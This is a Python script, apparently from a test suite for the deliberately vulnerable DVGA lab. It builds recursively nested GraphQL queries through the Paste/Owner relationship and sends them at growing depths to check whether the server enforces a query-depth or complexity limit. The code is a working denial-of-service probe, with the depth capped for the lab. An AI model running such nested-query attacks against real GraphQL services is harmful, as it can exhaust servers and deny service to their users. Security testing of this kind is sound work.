#!/usr/bin/env python3
"""
dvga_challenge_10_deep_recursion.py — DoS via deeply-nested GraphQL query.

Without a query-depth/complexity limit, a client can nest a field many levels
deep and force the server to resolve an exponentially large result set. DVGA's
`paste.owner { ... }` (and pastes -> owner) relationships make this easy to nest.

RELIABLE signal: the server accepts and executes a deeply-nested query (returns
data or a slow/5xx response) rather than rejecting it with a depth error. We
escalate the nesting depth and note where the server stops honouring it (or
doesn't). We cap the depth so we do not actually DoS the lab.
Run: python3 dvga_challenge_10_deep_recursion.py [--config ...]
"""
import argparse
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import dvga_common as dv


def find_config():
    if os.path.exists("dvga_config.yaml"):
        return "dvga_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "dvga_config.yaml")


def main():
    ap = argparse.ArgumentParser(description="DoS via deeply-nested GraphQL query")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = dv.load_config(args.config)
    base = dv.base_url(cfg)
    tout = dv.timeout(cfg)
    hdrs = dv.consumer_headers(810)

    # Build a nested query exploiting the Paste<->Owner cycle:
    #   pastes { owner { paste { owner { paste { ... { id } } } } } }
    # (PasteObject.owner -> OwnerObject, OwnerObject.paste -> PasteObject)
    def build(depth):
        inner = "id"
        for _ in range(depth):
            inner = f"owner {{ paste {{ {inner} }} }}"
        return f"query {{ pastes {{ {inner} }} }}"

    print(f"depth  outcome")
    unlimited = 0
    for depth in (1, 3, 5, 10, 20, 40, 80):
        q = build(depth)
        t0 = time.time()
        r = dv.graphql(base, q, None, cfg, hdrs, tout)
        dt = time.time() - t0
        if r is None:
            print(f"{depth:5}  transport error / timeout ({dt:.1f}s)")
            break
        body = r.json() if r.headers.get("content-type", "").find("json") >= 0 else {}
        has_data = bool((body.get("data") or {}).get("pastes"))
        has_err = bool(body.get("errors"))
        depth_err = any("depth" in (e.get("message") or "").lower() or "complexity" in (e.get("message") or "").lower()
                        for e in (body.get("errors") or []))
        if has_data and not depth_err:
            unlimited += 1
            outcome = f"HONORED (data, {dt:.1f}s)"
        elif depth_err:
            outcome = f"REJECTED depth-limit ({dt:.1f}s)"
        elif has_err:
            outcome = f"error ({dt:.1f}s)"
        else:
            outcome = f"no-data ({dt:.1f}s)"
        print(f"{depth:5}  {outcome}")

    print()
    if unlimited >= 3:
        print("[FINDING] no effective query-depth/complexity limit — deeply nested queries are honoured and "
              "grow resolution cost (deep-recursion DoS).")
    else:
        print("[ok] the server rejected or capped deeply-nested queries (depth/complexity protection present).")


if __name__ == "__main__":
    main()
